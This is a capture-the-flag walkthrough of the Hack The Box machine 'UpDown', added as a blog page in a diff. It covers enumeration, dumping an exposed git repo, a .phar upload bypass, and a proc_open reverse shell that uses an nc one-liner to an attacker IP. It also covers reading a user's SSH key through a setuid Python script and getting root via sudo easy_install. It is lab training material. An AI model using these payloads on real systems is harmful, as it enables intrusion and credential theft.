@@ -1,0 +1,351 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - UpDown [Medium] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - UpDown [Medium]"/>
+<meta name="twitter:description" content="Summary User Flag Searching the place for a dev space, dumping the parts for an entry; Knowing the phrase for something special, showing the ways to somewhere great. Seeing the place and reading the code, spotting the vulns and the craft; Checking the web for a mode, knowing the form then you are not far. Into the realm and get to the home, reading the bean and the animal; Knowing the bean superbs the animal, breaking out the stomach of the foke."/>
+
+    <meta property="og:title" content="HTB - UpDown [Medium]" />
+<meta property="og:description" content="Summary User Flag Searching the place for a dev space, dumping the parts for an entry; Knowing the phrase for something special, showing the ways to somewhere great. Seeing the place and reading the code, spotting the vulns and the craft; Checking the web for a mode, knowing the form then you are not far. Into the realm and get to the home, reading the bean and the animal; Knowing the bean superbs the animal, breaking out the stomach of the foke." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/updown/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-09-04T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-09-04T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - UpDown [Medium]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 4, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          7 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="summary">Summary</h1>
+<h2 id="user-flag">User Flag</h2>
+<ul>
+<li>Searching the place for a dev space, dumping the parts for an entry;</li>
+<li>Knowing the phrase for something special, showing the ways to somewhere great.</li>
+<li>Seeing the place and reading the code, spotting the vulns and the craft;</li>
+<li>Checking the web for a mode, knowing the form then you are not far.</li>
+<li>Into the realm and get to the home, reading the bean and the animal;</li>
+<li>Knowing the bean superbs the animal, breaking out the stomach of the foke.</li>
+</ul>
+<h2 id="root-flag">Root Flag</h2>
+<ul>
+<li>Checking the rights, knowing the mights;</li>
+<li>All you need is finding the right site.</li>
+</ul>
+<h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code># TCP Scan
+&gt; TARGET=10.129.110.172 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Is my Website up ?
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+</code></pre><h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>Browse to the site, found domain name: siteisup.htb, add to /etc/hosts</li>
+<li>Perform the conventional web enum</li>
+<li>Path enum:</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://siteisup.htb/
+
+[05:02:05] 200 -    0B  - /dev/                                             
+[05:02:05] 301 -  310B  - /dev  -&gt;  http://siteisup.htb/dev/                
+[05:02:20] 200 -    1KB - /index.php                                        
+[05:02:20] 200 -    1KB - /index.php/login/
+</code></pre><ul>
+<li>Subdomain enum:</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://siteisup.htb/&#34; -H &#34;Host: FUZZ.siteisup.htb&#34; --hl 39
+
+000000019:   403        9 L      28 W       281 Ch      &#34;dev&#34;
+</code></pre><ul>
+<li>Add dev.siteisup.htb to /etc/hosts</li>
+<li>Browse to <a href="http://dev.siteisup.htb/">http://dev.siteisup.htb/</a> gives 403</li>
+<li>Go back to the main page and investigate the form</li>
+<li>There is a form at <code>http://siteisup.htb</code> that can be used to check if a site is up</li>
+<li>Searching for 127.0.0.1, shows <code>Hacking attempt was detected !</code></li>
+<li>Searching for <code>http://siteisup.htb</code> shows <code>up</code></li>
+<li>Enabling <code>debug</code> mode shows the page&rsquo;s source</li>
+<li>Searching for <code>http://dev.siteisup.htb/</code> shows, <code>seems to be down.</code></li>
+<li>Perform enum using the web form&rsquo;s post feature</li>
+</ul>
+<pre tabindex="0"><code>&gt; ffuf -w /usr/share/wordlists/dirb/big.txt -X POST  -u http://siteisup.htb/ -d &#39;site=FUZZ&amp;debug=1&#39; -mc all -fr &#34;is up.&#34; -c -v
+Found nothing new
+</code></pre><ul>
+<li>Going back to path search under <code>/dev</code> give promising results</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://siteisup.htb/dev/
+
+[05:30:26] 200 -  772B  - /dev/.git/branches/                               
+[05:30:26] 301 -  315B  - /dev/.git  -&gt;  http://siteisup.htb/dev/.git/      
+[05:30:26] 200 -  298B  - /dev/.git/config
+[05:30:26] 200 -    3KB - /dev/.git/
+[05:30:26] 200 -   73B  - /dev/.git/description
+[05:30:26] 200 -   21B  - /dev/.git/HEAD
+</code></pre><ul>
+<li>There is a <code>git</code> repo there, use <code>git-dumper</code> to dump everything</li>
+</ul>
+<pre tabindex="0"><code>&gt; python3 ~/tools/git-dumper/git_dumper.py http://siteisup.htb/dev/ dev
+</code></pre><h1 id="source-inspection-special-header">Source inspection: special header</h1>
+<ul>
+<li>Inspect the dev repo</li>
+</ul>
+<pre tabindex="0"><code># check the logs
+&gt; git log
+commit 8812785e31c879261050e72e20f298ae8c43b565
+Author: Abdou.Y &lt;84577967+ab2pentest@users.noreply.github.com&gt;
+Date:   Wed Oct 20 16:38:54 2021 +0200
+
+    New technique in header to protect our dev vhost.
+</code></pre><ul>
+<li>This commit seems interesting, check out this commit</li>
+</ul>
+<pre tabindex="0"><code>&gt; git diff 8812785e31c879261050e72e20f298ae8c43b565 bc4ba79e596e9fd98f1b2837b9bd3548d04fe7ab
+diff --git a/.htaccess b/.htaccess
+index b317ab5..44ff240 100644
+--- a/.htaccess
++++ b/.htaccess
+@@ -2,4 +2,3 @@ SetEnvIfNoCase Special-Dev &#34;only4dev&#34; Required-Header
+ Order Deny,Allow
+ Deny from All
+ Allow from env=Required-Header
+</code></pre><ul>
+<li>So, a special header is required to access somewhere, perhaps it&rsquo;s <code>http://dev.siteisup.htb</code></li>
+<li>Add <code>Special-Dev: only4dev</code> as a header to try, this shows the content of <code>http://dev.siteisup.htb</code>, it worked</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl http://dev.siteisup.htb -H &#34;Special-Dev: only4dev&#34;
+</code></pre><ul>
+<li>Add a speacial header rule in burp to browse to the site</li>
+</ul>
+<h1 id="source-inspection-file-upload">Source inspection: file upload</h1>
+<ul>
+<li>Browsing the site <code>http://dev.siteisup.htb</code> found an upload form</li>
+<li>The code can be found in the dev repo, <code>checker.php</code></li>
+<li>We can see that the checker performs some extension checking, however it doesn&rsquo;t check for <code>.phar</code> extension</li>
+</ul>
+<pre tabindex="0"><code># Check if extension is allowed.
+$ext = getExtension($file);
+if(preg_match(&#34;/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i&#34;,$ext)){
+    die(&#34;Extension not allowed!&#34;);
+}
+</code></pre><ul>
+<li>Then it creats a folder with the md5 of time as the folder name, this can be enumerated. Later, it turned out that we don&rsquo;t have to calculate this, because once a folder is created, you can browse to <code>/uploads</code> to view the md5 name.</li>
+</ul>
+<pre tabindex="0"><code># Create directory to upload our file.
+$dir = &#34;uploads/&#34;.md5(time()).&#34;/&#34;;
+if(!is_dir($dir)){
+    mkdir($dir, 0770, true);
+}
+</code></pre><ul>
+<li>Then it reads the content of the file</li>
+</ul>
+<pre tabindex="0"><code># Upload the file.
+$final_path = $dir.$file;
+move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;], &#34;{$final_path}&#34;);
+
+# Read the uploaded file.
+$websites = explode(&#34;\n&#34;,file_get_contents($final_path));
+</code></pre><ul>
+<li>And it checks the sites one by one and delete the file after checking</li>
+</ul>
+<pre tabindex="0"><code>foreach($websites as $site){
+    $site=trim($site);
+    if(!preg_match(&#34;#file://#i&#34;,$site) &amp;&amp; !preg_match(&#34;#data://#i&#34;,$site) &amp;&amp; !preg_match(&#34;#ftp://#i&#34;,$site)){
+        $check=isitup($site);
+        if($check){
+            echo &#34;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;green&#39;&gt;is up ^_^&lt;/font&gt;&lt;/center&gt;&#34;;
+        }else{
+            echo &#34;&lt;center&gt;{$site}&lt;br&gt;&lt;font color=&#39;red&#39;&gt;seems to be down :(&lt;/font&gt;&lt;/center&gt;&#34;;
+        }	
+    }else{
+        echo &#34;&lt;center&gt;&lt;font color=&#39;red&#39;&gt;Hacking attempt was detected !&lt;/font&gt;&lt;/center&gt;&#34;;
+    }
+}
+
+# Delete the uploaded file.
+@unlink($final_path);
+</code></pre><h1 id="foothold">Foothold</h1>
+<ul>
+<li>Our plan of attack is this: let&rsquo;s create a .phar file with a huge number of sites to give us enough time to browse to our uploaded file. And we include some php code at the end of the file for RCE. Then, we upload the file. Finally, while the checker.php is busy checking the sites, we browse to the uploaded file to execute the code.</li>
+<li>Create a .phar file and write a lot of site address into it then followed by some php code</li>
+</ul>
+<pre tabindex="0"><code>http://site
+http://site
+http://site
+http://site
+...
+http://site
+http://site
+http://site
+&lt;?php
+phpinfo();
+?&gt;
+</code></pre><ul>
+<li>Upload the file, then browse to <code>http://dev.siteisup.htb/uploads/</code>, the temp folder md5 can be seen, then browse to that folder and click on the uploaded file to get php code execution result.</li>
+<li>Under <code>disable_functions</code>, we can see the following. However, <code>proc_open</code> is not among these.</li>
+</ul>
+<pre tabindex="0"><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,pcntl_unshare,error_log,system,exec,shell_exec,popen,passthru,link,symlink,syslog,ld,mail,stream_socket_sendto,dl,stream_socket_client,fsockopen
+</code></pre><ul>
+<li>We can refer to the official php documentation to get a reverse shell using just proc_open: <a href="https://www.php.net/manual/en/function.proc-open.php">https://www.php.net/manual/en/function.proc-open.php</a></li>
+</ul>
+<pre tabindex="0"><code>&lt;?php
+$descriptorspec = array(
+   0 =&gt; array(&#34;pipe&#34;, &#34;r&#34;),  // stdin is a pipe that the child will read from
+   1 =&gt; array(&#34;pipe&#34;, &#34;w&#34;),  // stdout is a pipe that the child will write to
+   2 =&gt; array(&#34;file&#34;, &#34;/tmp/error-output.txt&#34;, &#34;a&#34;) // stderr is a file to write to
+);
+$process = proc_open(&#39;sh&#39;, $descriptorspec, $pipes, $cwd, $env);
+if (is_resource($process)) {
+    fwrite($pipes[0], &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.16.59 4444 &gt;/tmp/f&#39;);
+    fclose($pipes[0]);
+    echo stream_get_contents($pipes[1]);
+    fclose($pipes[1]);
+    $return_value = proc_close($process);
+    echo &#34;command returned $return_value\n&#34;;
+}
+?&gt;
+</code></pre><ul>
+<li>Re-upload the .phar file and setup a nc listener to receive the shell.</li>
+</ul>
+<h1 id="pe-developer">PE: developer</h1>
+<ul>
+<li>On the host under <code>/home/developer</code> folder, there is a file called <code>siteisup</code> and a python script <code>siteisup_test.py</code>.</li>
+<li>We can see that <code>siteisup</code> is an executable with a <code>s</code> bit, which effectively gives it the user rights of developer.</li>
+</ul>
+<pre tabindex="0"><code>www-data@updown:/home/developer/dev$ ls -la
+total 32
+drwxr-x--- 2 developer www-data   4096 Jun 22 15:45 .
+drwxr-xr-x 6 developer developer  4096 Aug 30 11:24 ..
+-rwsr-x--- 1 developer www-data  16928 Jun 22 15:45 siteisup
+-rwxr-x--- 1 developer www-data    154 Jun 22 15:45 siteisup_test.py
+</code></pre><ul>
+<li>Inspect <code>siteisup_test.py</code> shows this is a python script that reads a user input. The <code>input</code> function is vulnerable to python sandbox escape by invoking <code>__import__</code></li>
+</ul>
+<pre tabindex="0"><code>www-data@updown:/home/developer/dev$ cat siteisup_test.py
+import requests
+
+url = input(&#34;Enter URL here:&#34;)
+page = requests.get(url)
+if page.status_code == 200:
+        print &#34;Website is up&#34;
+else:
+        print &#34;Website is down&#34;
+</code></pre><ul>
+<li>Inspecting the <code>siteisup</code> executable, there is a reference to the above python script, so this binary must be calling the python script. This means, we can just call this binary and exploit python to escape the sandbox to achieve code execution in developer&rsquo;s rights.</li>
+</ul>
+<pre tabindex="0"><code>www-data@updown:/home/developer/dev$ strings siteisup
+/lib64/ld-linux-x86-64.so.2
+libc.so.6
+puts
+setresgid
+setresuid
+system
+getegid
+geteuid
+__cxa_finalize
+__libc_start_main
+GLIBC_2.2.5
+_ITM_deregisterTMCloneTable
+__gmon_start__
+_ITM_registerTMCloneTable
+u+UH
+[]A\A]A^A_
+Welcome to &#39;siteisup.htb&#39; application
+/usr/bin/python /home/developer/dev/siteisup_test.py
+:*3$&#34;
+GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.1) 9.4.0
+crtstuff.c
+</code></pre><ul>
+<li>To exploit</li>
+</ul>
+<pre tabindex="0"><code>&gt; ./siteisup
+__import__(&#39;os&#39;).system(&#39;cat /home/developer/.ssh/id_rsa&#39;)
+</code></pre><ul>
+<li>This should give you the developer&rsquo;s id_rsa</li>
+<li>Now, this file can be used to access ssh as developer. Login to fetch the user flag</li>
+</ul>
+<h1 id="pe-root">PE: root</h1>
+<ul>
+<li>Simply check sudo, there is a binary that can be run as sudo</li>
+</ul>
+<pre tabindex="0"><code>developer@updown:~$ sudo -l
+Matching Defaults entries for developer on localhost:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User developer may run the following commands on localhost:
+    (ALL) NOPASSWD: /usr/local/bin/easy_install
+</code></pre><ul>
+<li>Refer to <code>gtfobins</code> for PE techniques: <a href="https://gtfobins.github.io/gtfobins/easy_install/#sudo">https://gtfobins.github.io/gtfobins/easy_install/#sudo</a></li>
+</ul>
+<pre tabindex="0"><code>developer@updown:~$ TF=$(mktemp -d)
+developer@updown:~$ echo &#34;import os; os.execl(&#39;/bin/sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&#34; &gt; $TF/setup.py
+developer@updown:~$ sudo easy_install $TF
+WARNING: The easy_install command is deprecated and will be removed in a future version.
+Processing tmp.H1LfIjX0EC
+Writing /tmp/tmp.H1LfIjX0EC/setup.cfg
+Running setup.py -q bdist_egg --dist-dir /tmp/tmp.H1LfIjX0EC/egg-dist-tmp-fqrhl7
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+</code></pre><ul>
+<li>You should be root now, fetch the root flag</li>
+</ul>
+
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
